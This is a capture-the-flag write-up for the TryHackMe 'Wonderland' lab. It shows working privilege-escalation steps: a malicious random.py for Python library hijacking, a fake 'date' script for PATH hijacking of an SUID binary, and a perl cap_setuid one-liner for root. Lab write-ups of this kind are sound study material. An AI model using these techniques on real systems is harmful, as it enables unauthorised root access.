# Try Hack Me - Wonderland
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 80
# Vulnerabilities: Python library hijacking, PATH hijacking, Privilege Escalation via Linux Capabilities

# Phase 1 - Reconnaissance:

port scan:

```bash
nmap -p- --min-rate=1000 <target_ip>
```

`PORT   STATE SERVICE`

`22/tcp open  ssh`

`80/tcp open  http`

![page1](https://github.com/realatharva15/wonderland_writeup/blob/main/images/page1.png)

the main page talks about "follow the white rabbit". this must be a hint for getting an initial foothold on the system. lets carry out a directory fuzz via gobuster

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt 
```

![gobuster](https://github.com/realatharva15/wonderland_writeup/blob/main/images/gobuster.png)

in the /img directory we find two .jpg files. 

```
NOTE: Whenever you face an image with a .jpg extension in a CTF, always perform a steganography scan on it
```

the alice_door.jpg had no hidden files in it , but the white_rabbit_1.jpg had something suspicious in it.

```bash
steghide extract -sf white_rabbit_1.jpg
```
we find a file named hints.txt which the words "follow the r a b b i t". this is a very crucial hint for travesing through the directories of the website.

```bash
gobuster dir -u http://<target_ip>/r -w /usr/share/wordlists/dirb/common.txt
```
the /a directory will be found and so on until the word rabbit is spelt in the way which goes like `/r/a/b/b/i/t` .

at the location http://<target_ip>/r/a/b/b/i/t we find ourselves in a dead end unless we look into the source code of the website. 

`/r/`
![ra](https://github.com/realatharva15/wonderland_writeup/blob/main/images/page2.png)

`/r/a/`
![rab](https://github.com/realatharva15/wonderland_writeup/blob/main/images/page3.png)

`/r/a/b/`
![rabb](https://github.com/realatharva15/wonderland_writeup/blob/main/images/page4.png)

`/r/a/b/b/`
![rabbi](https://github.com/realatharva15/wonderland_writeup/blob/main/images/page5.png)

`/r/a/b/b/i/t/`
![rabbit](https://github.com/realatharva15/wonderland_writeup/blob/main/images/page7.png)

at the end of this nonsense, we finally land on the last directory of the webpage. lets check there are any hints in the source code

![sourcecode](https://github.com/realatharva15/wonderland_writeup/blob/main/images/credentials.png)

we have found the credentials of the user alice. using these, we can access the ssh server with alice's privileges.

```bash
ssh alice@<target_ip>
#Enter Password when prompted
```
we have a shell as user alice! using the `sudo -l` command, it is found out that the user alice can execute the python script as follows:

`User alice may run the following commands on wonderland:`

    `(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

this script is run via another user named `rabbit`. this means user alice can execute the script `walrus_and_the_carpenter.py` as user rabbit. before jumping into crafting a malicious payload, we first have to understand what the `walrus_and_the_carpenter.py` script is doing.

![walrusscript]()

the code imports the random library for selecting any line from the text arbitrarily by using a for loop. with this information, a malicious library with the same name as `random` can be crafted which on execution will run the script which we write in our new `random` library.

but we have to make sure that our "malicious library" gets executed before the orignal library. for this to happen, let's find out `HOW python looks for modules on the system`. 

```python
python3.6 -c "import sys; print(sys.path)"
```
you'll most likely get a result which looks like this:

`['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']`

now look closely at the very first entry. the '' represents the current working directory, in this case it is is the directory where the python script is being executed. this is a big win for us as we can simply create the malicious library in the /home/alice directory itself. lets create a script which will give us a shell as `rabbit`

```bash
#NOTE: cd to /home/alice if you haven't yet

cat > random.py << 'EOF'
import os
import pty
os.system("/bin/bash")
EOF
```
now we just need to execute the `walrus_and_the_carpenter.py` as rabbit.

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
and voila! we have a shell as rabbit. lets start enumerating rabbit's home directory.

in the home directory of `rabbit` , we find a binary which is also an SUID. 

![teapartysuid]()

lets transfer it onto our attacker machine and analyse it using Ghidra. 

```bash
# on the target machine:
python3 -m http.server 8000
```
now on the attacker machine, download the binary `teaParty`

```bash
# on the attacker machine:
wget http://<target_ip>:8000/teaParty
```

lets use Ghidra to analyse the main() function after reverse engineering the binary.

![ghidra]()

```c
void main(void)
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```
in this code, we can clearly see that the UID and GID is changed to `0x3eb` which in decimal is `1003`. the main point of focus is the system() function which uses the relative path of the `date`. if you don't know, `date` is an externally executable binary file like `cp`, `ls` etc. since the program does not use the absolute path of the `date` binary which is `/usr/bin/date`, we can hijack the PATH variable by pointing it towards our own malicious binary named `date` aswell.

```bash
# first navigate to the /tmp directory
cd /tmp
```
now we have to just make write a code which will spawn a shell as the user `hatter`

```bash
cat > date << 'EOF'
#!/bin/bash
/bin/bash -i
EOF
```
```bash
#now make it executable
chmod +x date
```
the malicious `date` file has been created. now we can manipulate the PATH variable.

```bash
export PATH=/tmp:$PATH
```

now run the teaParty SUID to get a shell as `hatter`.

```bash
./teaParty
```

and just like that we have a shell as `hatter`. lets enumerate the home directory of `hatter` aswell.

in the home directory of `hatter`, a password.txt file is present. assuming that it is the password of `hatter` , we can ssh as `hatter`. now lets just hunt for the flags.

according to the hint for the user.txt flag, we might find it in the /root directory. (i used all variations of the find command but couldn't locate user.txt)

```bash
cat /root/user.txt
```
this gave us the user.txt flag. now lets elevate privileges to `root` and grab that root.txt flag. i used linpeas on the target machine and found out a 95% attack vector on the capabilities. as i did not have any prior knowledge on elavating privileges via capabilites, i used AI to learn how the capability is exploited. 

`Privilege Escalation via Capabilities:`

unlike the regular privileges which are atomic (all or nothing), eg. root user has privileges while a normal user does not, the capabilities feature allows the users to have privileges for some specific processes. 

for instance take a process with cap_setuid → Can ONLY change UID (no other root powers). this cap_setuid can be exploited by setting the uid to 0 (root). 

here the perl interpreter has the cap_setuid+ep capability set. lets use a one-liner from GTFObins to exploit it.

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```
and just like that we have rooted the machine and lets submit the root flag at /home/alice/root.txt

